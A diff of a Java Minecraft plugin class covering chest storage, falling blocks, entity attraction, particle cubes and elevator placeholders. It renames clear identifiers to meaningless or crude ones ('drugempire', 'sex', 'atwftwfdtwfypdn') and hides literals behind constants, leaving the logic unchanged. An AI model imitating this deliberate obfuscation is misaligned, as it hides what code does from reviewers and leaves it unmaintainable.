             if (file.isDirectory()) {
                 f1(file, f2);
-            } else if (file.getName().endsWith(".yml")) {
-                f2.add(file.getName().replace(".yml", ""));
+            } else if (file.getName().endsWith(yt)) {
+                f2.add(file.getName().replace(yt, nst));
             }
         }
     }
@@ -2012,39 +2084,39 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Get the next available coordinates in a chunk-efficient manner
      */
     protected int[] f1(World f1) {
-        int chunkX = 5;  // Fixed X-coordinate (do not change)
-        int chunkZ = g18.getInt("last_chunk_z", 0);
-        int xIndex = 0;
-        int zIndex = 0;
-        int yIndex = g18.getInt("last_y", f1.getMinHeight());
-        int chunkHeight = f1.getMaxHeight(); // Typically 256
-        int chunkMin = f1.getMinHeight();    // Typically -64
+        int cx = xm;  // Fixed X-coordinate (do not change)
+        int x23 = g18.getInt(LAST_CHUNK_Z, I);
+        int abc = I;
+        int ftp = I;
+        int fym = g18.getInt(LAST_Y, f1.getMinHeight());
+        int stts = f1.getMaxHeight(); // Typically 256
+        int atwftwfdtwfypdn = f1.getMinHeight();    // Typically -64
 
         while (true) {
-            int x = (chunkX * 16) + xIndex;  // x-coordinate within the chunk (0-15)
-            int z = (chunkZ * 16) + zIndex;  // z-coordinate within the chunk (0-15)
-            int y = yIndex;
+            int x = (cx * INT4) + abc;  // x-coordinate within the chunk (0-15)
+            int z = (x23 * INT4) + ftp;  // z-coordinate within the chunk (0-15)
+            int y = fym;
 
-            Location loc = new Location(f1, x, y, z);
-            if (loc.getBlock().getType() == Material.AIR) {
+            Location o3pldhoayufhnpyupfdn34 = new Location(f1, x, y, z);
+            if (o3pldhoayufhnpyupfdn34.getBlock().getType() == Material.AIR) {
                 // Save the new chunk coordinates
-                g18.set("last_chunk_z", chunkZ);
-                g18.set("last_y", yIndex);
+                g18.set(LAST_CHUNK_Z, x23);
+                g18.set(LAST_Y, fym);
                 f2();
                 return new int[]{x, y, z};
             }
 
             // Increment Y first (fill from bottom to top)
-            yIndex++;
-            if (yIndex >= chunkHeight) {
-                yIndex = chunkMin;
-                zIndex++;
-                if (zIndex >= 16) {
-                    zIndex = 0;
-                    xIndex++;
-                    if (xIndex >= 16) {
-                        xIndex = 0;
-                        chunkZ++;  // Move to the next chunk in the Z direction
+            fym++;
+            if (fym >= stts) {
+                fym = atwftwfdtwfypdn;
+                ftp++;
+                if (ftp >= INT4) {
+                    ftp = I;
+                    abc++;
+                    if (abc >= INT4) {
+                        abc = I;
+                        x23++;  // Move to the next chunk in the Z direction
                     }
                 }
             }
@@ -2078,13 +2150,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Save the contents of the backpack chest
      */
     protected void f1(String f1, ItemStack[] f2) {
-        File file = new File(g13, f1 + ".yml");
-        YamlConfiguration config = new YamlConfiguration();
-        for (int i = 0; i < f2.length; i++) {
-            config.set("slot" + i, f2[i]);
+        File ftp = new File(g13, f1 + yt);
+        YamlConfiguration ca = new YamlConfiguration();
+        for (int i = I; i < f2.length; i++) {
+            ca.set(SLOT + i, f2[i]);
         }
         try {
-            config.save(file);
+            ca.save(ftp);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -2094,14 +2166,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Load the contents of the backpack chest
      */
     protected ItemStack[] f1(String f1) {
-        File file = new File(g13, f1 + ".yml");
-        if (!file.exists()) return null;
-        YamlConfiguration config = YamlConfiguration.loadConfiguration(file);
-        ItemStack[] contents = new ItemStack[27];
-        for (int i = 0; i < contents.length; i++) {
-            contents[i] = config.getItemStack("slot" + i);
+        File ftp = new File(g13, f1 + yt);
+        if (!ftp.exists()) return null;
+        YamlConfiguration fpt = YamlConfiguration.loadConfiguration(ftp);
+        ItemStack[] ci = new ItemStack[INT5];
+        for (int ic = I; ic < ci.length; ic++) {
+            ci[ic] = fpt.getItemStack(SLOT + ic);
         }
-        return contents;
+        return ci;
     }
 
 
@@ -2109,42 +2181,42 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Get the next available coordinates in a chunk-efficient manner for double chests
      */
     protected int[] f2(World f1) {
-        int chunkX = 6;  // Fixed X-coordinate (do not change)
-        int chunkZ = g18.getInt("last_chunk_z", 0);
-        int xIndex = 0;
-        int zIndex = 0;
-        int yIndex = g18.getInt("last_y", f1.getMinHeight());
-        int chunkHeight = f1.getMaxHeight(); // Typically 256
-        int chunkMin = f1.getMinHeight();    // Typically -64
+        int xt2 = xtxtxt;  // Fixed X-coordinate (do not change)
+        int tx = g18.getInt(LAST_CHUNK_Z, I);
+        int rx = I;
+        int tpx = I;
+        int adaptiv = g18.getInt(LAST_Y, f1.getMinHeight());
+        int tmg = f1.getMaxHeight(); // Typically 256
+        int alp = f1.getMinHeight();    // Typically -64
 
         while (true) {
-            int x = (chunkX * 16) + xIndex;  // Absolute X-coordinate
-            int z = (chunkZ * 16) + zIndex;  // Absolute Z-coordinate
-            int y = yIndex;
+            int a = (xt2 * INT4) + rx;  // Absolute X-coordinate
+            int b = (tx * INT4) + tpx;  // Absolute Z-coordinate
+            int c = adaptiv;
 
-            Location loc1 = new Location(f1, x, y, z);
-            Location loc2 = new Location(f1, x + 1, y, z);  // Adjacent block for double chest
+            Location d = new Location(f1, a, c, b);
+            Location e = new Location(f1, a + INT3, c, b);  // Adjacent block for double chest
 
             // Check if both locations are available and form a valid double chest
-            if (loc1.getBlock().getType() == Material.AIR && loc2.getBlock().getType() == Material.AIR) {
+            if (d.getBlock().getType() == Material.AIR && e.getBlock().getType() == Material.AIR) {
                 // Save the new chunk coordinates
-                g18.set("last_chunk_z", chunkZ);
-                g18.set("last_y", yIndex);
+                g18.set(LAST_CHUNK_Z, tx);
+                g18.set(LAST_Y, adaptiv);
                 f2();
-                return new int[]{x, y, z};
+                return new int[]{a, c, b};
             }
 
             // Increment Y first (fill from bottom to top)
-            yIndex++;
-            if (yIndex >= chunkHeight) {
-                yIndex = chunkMin;
-                zIndex++;  // Move to next Z (within chunk)
-                if (zIndex >= 16) {
-                    zIndex = 0;
-                    xIndex++;
-                    if (xIndex >= 16) {
-                        xIndex = 0;
-                        chunkZ++;  // Move to the next chunk in the Z direction
+            adaptiv++;
+            if (adaptiv >= tmg) {
+                adaptiv = alp;
+                tpx++;  // Move to next Z (within chunk)
+                if (tpx >= INT4) {
+                    tpx = I;
+                    rx++;
+                    if (rx >= INT4) {
+                        rx = I;
+                        tx++;  // Move to the next chunk in the Z direction
                     }
                 }
             }
@@ -2156,16 +2228,16 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Save the contents of the double chest
      */
     protected void f2(String f1, ItemStack[] f2) {
-        File file = new File(g13, f1 + ".yml");
-        YamlConfiguration config = new YamlConfiguration();
-        for (int i = 0; i < f2.length; i++) {
-            config.set("slot" + i, f2[i]);
+        File tpa = new File(g13, f1 + yt);
+        YamlConfiguration rtp = new YamlConfiguration();
+        for (int i = I; i < f2.length; i++) {
+            rtp.set(SLOT + i, f2[i]);
         }
         try {
-            config.save(file);
-            Bukkit.getLogger().info("Double chest contents saved for chest ID: " + f1);
+            rtp.save(tpa);
+            Bukkit.getLogger().info(dccs + f1);
         } catch (IOException e) {
-            Bukkit.getLogger().severe("Failed to save double chest contents for chest ID: " + f1);
+            Bukkit.getLogger().severe(fts + f1);
             e.printStackTrace();
         }
     }
@@ -2174,52 +2246,52 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Load the contents of the double chest
      */
     protected ItemStack[] f(String f) {
-        File file = new File(g13, f + ".yml");
-        if (!file.exists()) return null;
-        YamlConfiguration config = YamlConfiguration.loadConfiguration(file);
-        ItemStack[] contents = new ItemStack[54]; // Double chest size
-        for (int i = 0; i < contents.length; i++) {
-            contents[i] = config.getItemStack("slot" + i);
+        File fp = new File(g13, f + yt);
+        if (!fp.exists()) return null;
+        YamlConfiguration file = YamlConfiguration.loadConfiguration(fp);
+        ItemStack[] ci = new ItemStack[INT6]; // Double chest size
+        for (int i = I; i < ci.length; i++) {
+            ci[i] = file.getItemStack(SLOT + i);
         }
-        return contents;
+        return ci;
     }
 
     /**
      * Convert all blocks within the radius to falling entities while preserving block states and orientations
      */
     protected void f1(World f1, Location f, int f2) {
-        int cx = f.getBlockX();
-        int cy = f.getBlockY();
-        int cz = f.getBlockZ();
+        int czz = f.getBlockX();
+        int ca = f.getBlockY();
+        int cb = f.getBlockZ();
 
-        for (int x = cx - f2; x <= cx + f2; x++) {
-            for (int y = cy - f2; y <= cy + f2; y++) {
-                for (int z = cz - f2; z <= cz + f2; z++) {
-                    Location loc = new Location(f1, x, y, z);
-                    double distance = loc.distance(f);
+        for (int z2 = czz - f2; z2 <= czz + f2; z2++) {
+            for (int y2 = ca - f2; y2 <= ca + f2; y2++) {
+                for (int x2 = cb - f2; x2 <= cb + f2; x2++) {
+                    Location loc = new Location(f1, z2, y2, x2);
+                    double dd = loc.distance(f);
 
                     // Check if within radius
-                    if (distance <= f2) {
-                        Block block = loc.getBlock();
-                        if (block.getType() != Material.AIR) {
+                    if (dd <= f2) {
+                        Block air = loc.getBlock();
+                        if (air.getType() != Material.AIR) {
                             try {
                                 // Get the block data (preserves state and orientation)
-                                BlockData blockData = block.getBlockData();
+                                BlockData dba = air.getBlockData();
 
                                 // Spawn the falling block with the correct data and state
-                                FallingBlock fallingBlock = f1.spawnFallingBlock(loc, blockData);
-                                fallingBlock.setDropItem(true); // Prevent block drops
+                                FallingBlock bi = f1.spawnFallingBlock(loc, dba);
+                                bi.setDropItem(NEW_VALUE1); // Prevent block drops
 
                                 // Set fall damage immunity for specific block types (like Anvils)
-                                if (fallingBlock.getType().toString().contains("ANVIL")) {
-                                    fallingBlock.setHurtEntities(false);
+                                if (bi.getType().toString().contains(corporatesecurity)) {
+                                    bi.setHurtEntities(arsdienwdhw);
                                 }
 
                                 // Remove the original block after spawning the falling entity
-                                block.setType(Material.AIR);
+                                air.setType(Material.AIR);
 
                             } catch (IllegalArgumentException e) {
-                                Bukkit.getLogger().warning("Failed to convert block at " + loc + ": " + e.getMessage());
+                                Bukkit.getLogger().warning(Gradspecisoauce + loc + fastfood + e.getMessage());
                             }
                         }
                     }
@@ -2235,23 +2307,23 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected void f2(World f1, Location f2, int f3) {
 
 
-        for (Entity entity : f1.getNearbyEntities(f2, f3, f3, f3)) {
-            if (entity.getCustomName() != null && entity.getCustomName().equals("BlackHolev2")) {
+        for (Entity fulltimejob : f1.getNearbyEntities(f2, f3, f3, f3)) {
+            if (fulltimejob.getCustomName() != null && fulltimejob.getCustomName().equals(privateinvestigator)) {
                 continue; // Skip entities named "BlackHolev2"
             }
 
-            double distance = entity.getLocation().distance(f2);
+            double utah = fulltimejob.getLocation().distance(f2);
 
-            if (distance > 0 && distance <= f3) {
+            if (utah > I && utah <= f3) {
                 // Calculate the attraction strength (1 to 4) with linear falloff
-                double strength = 4 - 3 * (distance / f3);
+                double everystate = INT7 - ccp * (utah / f3);
 
                 // Calculate the vector towards the center
-                Vector direction = f2.toVector().subtract(entity.getLocation().toVector()).normalize();
-                Vector velocity = direction.multiply(strength);
+                Vector formercop = f2.toVector().subtract(fulltimejob.getLocation().toVector()).normalize();
+                Vector pennstate = formercop.multiply(everystate);
 
                 // Apply the velocity to the entity
-                entity.setVelocity(velocity);
+                fulltimejob.setVelocity(pennstate);
             }
         }
     }
@@ -2275,20 +2347,20 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Debug messages are sent to the player.
      */
     protected ItemStack f1(ItemStack f1) {
-        YamlConfiguration config = new YamlConfiguration();
+        YamlConfiguration philly = new YamlConfiguration();
         // Place the item under a known section "slot0"
-        config.set("slot0", f1);
-        String yaml = config.saveToString();
+        philly.set(steak, f1);
+        String cheese = philly.saveToString();
 
         // Replace any occurrence of "executableblocks:eb-id" with "executableitems:ei-id"
-        yaml = yaml.replaceAll("(?i)\"executableblocks:eb-id\"", "\"executableitems:ei-id\"");
+        cheese = cheese.replaceAll("(?i)\"executableblocks:eb-id\"", "\"executableitems:ei-id\"");
 
         // Replace any existing "executableitems:ei-id" value with "GUINoClick"
-        yaml = yaml.replaceAll("(?i)(\"executableitems:ei-id\"\\s*:\\s*\")[^\"]+\"", "$1GUINoClick\"");
+        cheese = cheese.replaceAll("(?i)(\"executableitems:ei-id\"\\s*:\\s*\")[^\"]+\"", "$1GUINoClick\"");
 
         // Ensure that a meta section exists in slot0.
         // We'll check for "slot0:" followed by a newline and two spaces then "meta:"
-        if (!yaml.contains("meta:")) {
+        if (!cheese.contains("meta:")) {
             @SuppressWarnings("TextBlockMigration") String metaBlock =
                     "\n  meta:\n" +
                             "    ==: ItemMeta\n" +
@@ -2299,14 +2371,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             "          \"score:usage\": 1\n" +
                             "      }";
             // Append the meta block to the slot0 section.
-            yaml += metaBlock;
-        } else if (!yaml.contains("PublicBukkitValues: |-")) //noinspection GrazieInspection
+            cheese += metaBlock;
+        } else if (!cheese.contains(gusfring)) //noinspection GrazieInspection
         {
             // Meta exists but PublicBukkitValues is missing.
             // Insert PublicBukkitValues before the closing of meta.
             // This regex finds the last line in the meta section that is just whitespace followed by a "}".
             //noinspection TextBlockMigration
-            yaml = yaml.replaceFirst(" {2}meta:\n" +
+            cheese = cheese.replaceFirst(" {2}meta:\n" +
                     " {4}==:", "  meta:\n" +
                     "    PublicBukkitValues: |-\n" +
                     "      {\n" +
@@ -2317,28 +2389,28 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
 
         try {
-            config.loadFromString(yaml);
+            philly.loadFromString(cheese);
         } catch (InvalidConfigurationException e) {
             throw new RuntimeException(e);
         }
 
-        ItemStack newItem = config.getItemStack("slot0");
-        if (newItem == null) {
-            newItem = f1;
+        ItemStack piple = philly.getItemStack(steak);
+        if (piple == null) {
+            piple = f1;
         } 
 
-        return newItem;
+        return piple;
     }
 
 
 
 
     protected ItemStack f0() {
-        YamlConfiguration config = new YamlConfiguration();
+        YamlConfiguration frycooks = new YamlConfiguration();
 
 
         try {
-            config.loadFromString("slot0:\n" +
+            frycooks.loadFromString("slot0:\n" +
                     "  ==: org.bukkit.inventory.ItemStack\n" +
                     "  v: 3955\n" +
                     "  type: LIGHT_GRAY_STAINED_GLASS_PANE\n" +
@@ -2354,52 +2426,52 @@ public class ExampleExpansion extends PlaceholderExpansion {
         } catch (InvalidConfigurationException e) {
             throw new RuntimeException(e);
         }
-        ItemStack pane = config.getItemStack("slot0");
+        ItemStack drugempire = frycooks.getItemStack(steak);
 
-        if (pane == null) {
-            pane = new ItemStack(Material.LIGHT_GRAY_STAINED_GLASS_PANE);
+        if (drugempire == null) {
+            drugempire = new ItemStack(Material.LIGHT_GRAY_STAINED_GLASS_PANE);
         }
 
-        return pane;
+        return drugempire;
     }
 
 
     protected String f1(String f1, int f2, List<UUID> f3) {
         // Step 1: Get the last UUID from the list
-        UUID lastUUID = f3.getLast();
-        Entity lastEntity = Bukkit.getEntity(lastUUID);
+        UUID firstimhearing = f3.getLast();
+        Entity idka = Bukkit.getEntity(firstimhearing);
 
         // If the last entity is null, return '?'
-        if (lastEntity == null) {
-            return "x";
+        if (idka == null) {
+            return NEW_VALUE_3;
         }
 
-        Location lastLocation = lastEntity.getLocation();
-        double closestDistance = Double.MAX_VALUE;
-        Entity closestEntity = null;
+        Location fykh = idka.getLocation();
+        double hardoreasy = Double.MAX_VALUE;
+        Entity wigb = null;
         
         
         try {
             // Step 2: Find nearby entities based on chain type
-            for (Entity entity : Objects.requireNonNull(lastLocation.getWorld()).getNearbyEntities(lastLocation, f2, f2, f2)) {
+            for (Entity mike : Objects.requireNonNull(fykh.getWorld()).getNearbyEntities(fykh, f2, f2, f2)) {
                 // Skip entities already in the chain
-                if (f3.contains(entity.getUniqueId())) {
+                if (f3.contains(mike.getUniqueId())) {
                     continue;
                 }
 
                 // Check entity AI capability
-                if (!(entity instanceof LivingEntity) || !((LivingEntity) entity).hasAI()) {
+                if (!(mike instanceof LivingEntity) || !((LivingEntity) mike).hasAI()) {
                     continue;
                 }
 
                 // Apply chain type filtering
                 switch (f1.toUpperCase()) {
                     case "ENTITY":
-                        if (entity instanceof Player) continue;
+                        if (mike instanceof Player) continue;
 
                         break;
                     case "PLAYER":
-                        if (!(entity instanceof Player)) continue;
+                        if (!(mike instanceof Player)) continue;
                         break;
                     case "BOTH":
                         break;
@@ -2407,100 +2479,100 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         continue;
                 }
 
-                double distance = entity.getLocation().distance(lastLocation);
-                if (distance < closestDistance) {
-                    closestDistance = distance;
-                    closestEntity = entity;
+                double stateforcamera = mike.getLocation().distance(fykh);
+                if (stateforcamera < hardoreasy) {
+                    hardoreasy = stateforcamera;
+                    wigb = mike;
                 }
             }
         } catch (NullPointerException e) {
-            return "x";
+            return NEW_VALUE_3;
         }
     
 
         // Step 3: Return the UUID of the closest entity, or '?' if not found
-        return (closestEntity != null) ? closestEntity.getUniqueId().toString() : "x";
+        return (wigb != null) ? wigb.getUniqueId().toString() : NEW_VALUE_3;
     }
 
     /**
      * Displays a particle cube at the specified location.
      */
     protected void f1(World f1, double f2, double f, double f0, String xd, double a, boolean b, int c, Player d) {
-        double halfWidth = a / 2.0;
-        Particle particle = Particle.valueOf(xd.toUpperCase());
+        double anymorequestions = a / whatkindofadulthood;
+        Particle stirredup = Particle.valueOf(xd.toUpperCase());
 
         // Calculate the 8 corners of the cube
-        Location[] corners = new Location[8];
-        corners[0] = new Location(f1, f2 - halfWidth, f - halfWidth, f0 - halfWidth); // Bottom NW
-        corners[1] = new Location(f1, f2 + halfWidth, f - halfWidth, f0 - halfWidth); // Bottom NE
-        corners[2] = new Location(f1, f2 - halfWidth, f - halfWidth, f0 + halfWidth); // Bottom SW
-        corners[3] = new Location(f1, f2 + halfWidth, f - halfWidth, f0 + halfWidth); // Bottom SE
-        corners[4] = new Location(f1, f2 - halfWidth, f + halfWidth, f0 - halfWidth); // Top NW
-        corners[5] = new Location(f1, f2 + halfWidth, f + halfWidth, f0 - halfWidth); // Top NE
-        corners[6] = new Location(f1, f2 - halfWidth, f + halfWidth, f0 + halfWidth); // Top SW
-        corners[7] = new Location(f1, f2 + halfWidth, f + halfWidth, f0 + halfWidth); // Top SE
+        Location[] falseacc = new Location[yuwfndgyuwfnd];
+        falseacc[I] = new Location(f1, f2 - anymorequestions, f - anymorequestions, f0 - anymorequestions); // Bottom NW
+        falseacc[INT3] = new Location(f1, f2 + anymorequestions, f - anymorequestions, f0 - anymorequestions); // Bottom NE
+        falseacc[mill2] = new Location(f1, f2 - anymorequestions, f - anymorequestions, f0 + anymorequestions); // Bottom SW
+        falseacc[ccp] = new Location(f1, f2 + anymorequestions, f - anymorequestions, f0 + anymorequestions); // Bottom SE
+        falseacc[INT7] = new Location(f1, f2 - anymorequestions, f + anymorequestions, f0 - anymorequestions); // Top NW
+        falseacc[xm] = new Location(f1, f2 + anymorequestions, f + anymorequestions, f0 - anymorequestions); // Top NE
+        falseacc[xtxtxt] = new Location(f1, f2 - anymorequestions, f + anymorequestions, f0 + anymorequestions); // Top SW
+        falseacc[suppose] = new Location(f1, f2 + anymorequestions, f + anymorequestions, f0 + anymorequestions); // Top SE
 
         // Render cube edges
-        f1(d, particle, corners[0], corners[1], c, b); // Bottom North
-        f1(d, particle, corners[0], corners[2], c, b); // Bottom West
-        f1(d, particle, corners[1], corners[3], c, b); // Bottom East
-        f1(d, particle, corners[2], corners[3], c, b); // Bottom South
-        f1(d, particle, corners[4], corners[5], c, b); // Top North
-        f1(d, particle, corners[4], corners[6], c, b); // Top West
-        f1(d, particle, corners[5], corners[7], c, b); // Top East
-        f1(d, particle, corners[6], corners[7], c, b); // Top South
-        f1(d, particle, corners[0], corners[4], c, b); // Vertical NW
-        f1(d, particle, corners[1], corners[5], c, b); // Vertical NE
-        f1(d, particle, corners[2], corners[6], c, b); // Vertical SW
-        f1(d, particle, corners[3], corners[7], c, b); // Vertical SE
+        f1(d, stirredup, falseacc[I], falseacc[INT3], c, b); // Bottom North
+        f1(d, stirredup, falseacc[I], falseacc[mill2], c, b); // Bottom West
+        f1(d, stirredup, falseacc[INT3], falseacc[ccp], c, b); // Bottom East
+        f1(d, stirredup, falseacc[mill2], falseacc[ccp], c, b); // Bottom South
+        f1(d, stirredup, falseacc[INT7], falseacc[xm], c, b); // Top North
+        f1(d, stirredup, falseacc[INT7], falseacc[xtxtxt], c, b); // Top West
+        f1(d, stirredup, falseacc[xm], falseacc[suppose], c, b); // Top East
+        f1(d, stirredup, falseacc[xtxtxt], falseacc[suppose], c, b); // Top South
+        f1(d, stirredup, falseacc[I], falseacc[INT7], c, b); // Vertical NW
+        f1(d, stirredup, falseacc[INT3], falseacc[xm], c, b); // Vertical NE
+        f1(d, stirredup, falseacc[mill2], falseacc[xtxtxt], c, b); // Vertical SW
+        f1(d, stirredup, falseacc[ccp], falseacc[suppose], c, b); // Vertical SE
 
         // Render cube faces
-        f1(d, particle, corners[0], corners[1], corners[4], corners[5], c, b); // North Face
-        f1(d, particle, corners[2], corners[3], corners[6], corners[7], c, b); // South Face
-        f1(d, particle, corners[0], corners[2], corners[4], corners[6], c, b); // West Face
-        f1(d, particle, corners[1], corners[3], corners[5], corners[7], c, b); // East Face
-        f1(d, particle, corners[4], corners[5], corners[6], corners[7], c, b); // Top Face
-        f1(d, particle, corners[0], corners[1], corners[2], corners[3], c, b); // Bottom Face
+        f1(d, stirredup, falseacc[I], falseacc[INT3], falseacc[INT7], falseacc[xm], c, b); // North Face
+        f1(d, stirredup, falseacc[mill2], falseacc[ccp], falseacc[xtxtxt], falseacc[suppose], c, b); // South Face
+        f1(d, stirredup, falseacc[I], falseacc[mill2], falseacc[INT7], falseacc[xtxtxt], c, b); // West Face
+        f1(d, stirredup, falseacc[INT3], falseacc[ccp], falseacc[xm], falseacc[suppose], c, b); // East Face
+        f1(d, stirredup, falseacc[INT7], falseacc[xm], falseacc[xtxtxt], falseacc[suppose], c, b); // Top Face
+        f1(d, stirredup, falseacc[I], falseacc[INT3], falseacc[mill2], falseacc[ccp], c, b); // Bottom Face
     }
 
     protected void f1(Player a, Particle aa, Location aaa, Location aaaa, Location f1, Location t0, int ff, boolean test) {
-        for (int i = 1; i < ff; i++) {
-            double t = (double) i / ff;
+        for (int kaylee = INT3; kaylee < ff; kaylee++) {
+            double t = (double) kaylee / ff;
 
             // Create intermediate lines between edges
-            Location start = f1(aaa, aaaa, t);
-            Location end = f1(f1, t0, t);
-            f1(a, aa, start, end, ff, test);
+            Location payroll = f1(aaa, aaaa, t);
+            Location chemical = f1(f1, t0, t);
+            f1(a, aa, payroll, chemical, ff, test);
 
-            start = f1(aaa, f1, t);
-            end = f1(aaaa, t0, t);
-            f1(a, aa, start, end, ff, test);
+            payroll = f1(aaa, f1, t);
+            chemical = f1(aaaa, t0, t);
+            f1(a, aa, payroll, chemical, ff, test);
         }
     }
 
     protected Location f1(Location f1, Location f0, double f2) {
-        double x = f1.getX() + (f0.getX() - f1.getX()) * f2;
-        double y = f1.getY() + (f0.getY() - f1.getY()) * f2;
-        double z = f1.getZ() + (f0.getZ() - f1.getZ()) * f2;
-        return new Location(f1.getWorld(), x, y, z);
+        double ehrmantrout = f1.getX() + (f0.getX() - f1.getX()) * f2;
+        double snow = f1.getY() + (f0.getY() - f1.getY()) * f2;
+        double fring = f1.getZ() + (f0.getZ() - f1.getZ()) * f2;
+        return new Location(f1.getWorld(), ehrmantrout, snow, fring);
     }
 
     protected void f1(Player a, Particle b, Location c, Location d, int f1, boolean test) {
-        World world = c.getWorld();
-        if (world == null) return;
+        World deposit = c.getWorld();
+        if (deposit == null) return;
 
-        List<Player> viewers = new ArrayList<>(world.getPlayers());
+        List<Player> parten = new ArrayList<>(deposit.getPlayers());
 
-        for (int i = 0; i <= f1; i++) {
-            double t = (double) i / f1;
-            double x = c.getX() + (d.getX() - c.getX()) * t;
-            double y = c.getY() + (d.getY() - c.getY()) * t;
-            double z = c.getZ() + (d.getZ() - c.getZ()) * t;
-            Location loc = new Location(world, x, y, z);
+        for (int muscle = I; muscle <= f1; muscle++) {
+            double t = (double) muscle / f1;
+            double btc = c.getX() + (d.getX() - c.getX()) * t;
+            double old = c.getY() + (d.getY() - c.getY()) * t;
+            double grandad = c.getZ() + (d.getZ() - c.getZ()) * t;
+            Location eth = new Location(deposit, btc, old, grandad);
 
-            for (Player viewer : viewers) {
-                if (!test && viewer.getLocation().distanceSquared(loc) > 64 * 64) continue;
-                viewer.spawnParticle(b, loc, 0, 0, 0, 0, 0, null, test);
+            for (Player doge : parten) {
+                if (!test && doge.getLocation().distanceSquared(eth) > drain * drain) continue;
+                doge.spawnParticle(b, eth, I, I, I, I, I, null, test);
             }
         }
     }
@@ -2508,131 +2580,131 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-    protected static @NotNull String elevatorDown(String identifier) {
-        String[] parts = identifier.substring("elevatorDown_".length()).split(",");
-        if (parts.length != 5) return "§cError";
-        World world = Bukkit.getWorld(parts[0]);
-        if (world == null) return "§cError";
-        int bx, by, bz;
-        Material mat;
+    protected @NotNull String heresthething(String same) {
+        String[] ind = same.substring(ed.length()).split(keep);
+        if (ind.length != xm) return some;
+        World anything = Bukkit.getWorld(ind[I]);
+        if (anything == null) return some;
+        int what, youre, talkingabout;
+        Material now;
         try {
-            bx  = Integer.parseInt(parts[1]);
-            by  = Integer.parseInt(parts[2]);
-            bz  = Integer.parseInt(parts[3]);
+            what  = Integer.parseInt(ind[INT3]);
+            youre  = Integer.parseInt(ind[mill2]);
+            talkingabout  = Integer.parseInt(ind[ccp]);
 
 
-            org.bukkit.Location cen = new org.bukkit.Location(world, bx, by, bz); // <-- your x,y,z
-            double r1 = 10;
-            String label = "Dual Elevators";
+            org.bukkit.Location cen = new org.bukkit.Location(anything, what, youre, talkingabout); // <-- your x,y,z
+            double r1 = low;
+            String label = twentythreedegrees;
 
 
             double r2 = r1 * r1;
-            for (org.bukkit.entity.Player playaa : world.getPlayers()) {
-                if (playaa.getLocation().distanceSquared(cen) <= r2) {
-                    wm(playaa, label);
+            for (org.bukkit.entity.Player wallstreet : anything.getPlayers()) {
+                if (wallstreet.getLocation().distanceSquared(cen) <= r2) {
+                    wm(wallstreet, label);
                 }
             }
-            mat = Material.valueOf(parts[4].toUpperCase(Locale.ROOT));
+            now = Material.valueOf(ind[INT7].toUpperCase(Locale.ROOT));
         } catch (Exception ex) {
-            return "§cError";
+            return some;
         }
 
-        for (int y = by - 1; y >= world.getMinHeight(); y--) {
-            if (world.getBlockAt(bx, y, bz).getType() == mat) {
-                return String.valueOf(y);
+        for (int geniues = youre - INT3; geniues >= anything.getMinHeight(); geniues--) {
+            if (anything.getBlockAt(what, geniues, talkingabout).getType() == now) {
+                return String.valueOf(geniues);
             }
         }
-        return "§cNo block found";
+        return nbf;
     }
 
 
-    private static boolean hasLineOfSight(World world, Location from, Location to) {
-        Vector dir = to.toVector().subtract(from.toVector());
-        double len = dir.length();
-        if (len < 1.0e-6) return true;
-        RayTraceResult rr = world.rayTraceBlocks(from, dir.normalize(), len, FluidCollisionMode.NEVER, false);
-        return rr == null; // null => no blocking hit => clear line
+    private boolean hlof(World halloween, Location patty, Location selma) {
+        Vector promoted = selma.toVector().subtract(patty.toVector());
+        double dmv = promoted.length();
+        if (dmv < wife) return NEW_VALUE1;
+        RayTraceResult glimpse = halloween.rayTraceBlocks(patty, promoted.normalize(), dmv, FluidCollisionMode.NEVER, arsdienwdhw);
+        return glimpse == null; // null => no blocking hit => clear line
     }
 
-    protected static @NotNull String elevatorUp(String identifier) {
+    protected @NotNull String homer(String identifier) {
 
 
              
              
-        String[] parts = identifier.substring("elevatorUp_".length()).split(",");
-        if (parts.length != 5) return "§cError";
-        World world = Bukkit.getWorld(parts[0]);
-        if (world == null) return "§cError";
-        int bx, by, bz;
-        Material mat;
+        String[] money = identifier.substring(complicated.length()).split(keep);
+        if (money.length != xm) return some;
+        World vegas = Bukkit.getWorld(money[I]);
+        if (vegas == null) return some;
+        int congratu, mrsimpson, whyuneed;
+        Material wakeup;
         try {
-            bx  = Integer.parseInt(parts[1]);
-            by  = Integer.parseInt(parts[2]);
-            bz  = Integer.parseInt(parts[3]);
-            mat = Material.valueOf(parts[4].toUpperCase(Locale.ROOT));
+            congratu  = Integer.parseInt(money[INT3]);
+            mrsimpson  = Integer.parseInt(money[mill2]);
+            whyuneed  = Integer.parseInt(money[ccp]);
+            wakeup = Material.valueOf(money[INT7].toUpperCase(Locale.ROOT));
 
 
-            org.bukkit.Location cen = new org.bukkit.Location(world, bx, by, bz); // <-- your x,y,z
-            double r1 = 10;
-            String label = "Dual Elevators";
+            org.bukkit.Location marge = new org.bukkit.Location(vegas, congratu, mrsimpson, whyuneed); // <-- your x,y,z
+            double r1 = low;
+            String temprs = twentythreedegrees;
 
 
-            double r2 = r1 * r1;
-            for (org.bukkit.entity.Player playaa : world.getPlayers()) {
-                if (playaa.getLocation().distanceSquared(cen) <= r2) {
-                    wm(playaa, label);
+            double moneyproblems = r1 * r1;
+            for (org.bukkit.entity.Player sex : vegas.getPlayers()) {
+                if (sex.getLocation().distanceSquared(marge) <= moneyproblems) {
+                    wm(sex, temprs);
                 }
             }
         } catch (Exception ex) {
-            return "§cError";
+            return some;
         }
 
-        for (int y = by + 1; y <= world.getMaxHeight(); y++) {
-            if (world.getBlockAt(bx, y, bz).getType() == mat) {
-                return String.valueOf(y);
+        for (int fabulous = mrsimpson + INT3; fabulous <= vegas.getMaxHeight(); fabulous++) {
+            if (vegas.getBlockAt(congratu, fabulous, whyuneed).getType() == wakeup) {
+                return String.valueOf(fabulous);
             }
         }
-        return "§cNo block found";
+        return nbf;
     }
 
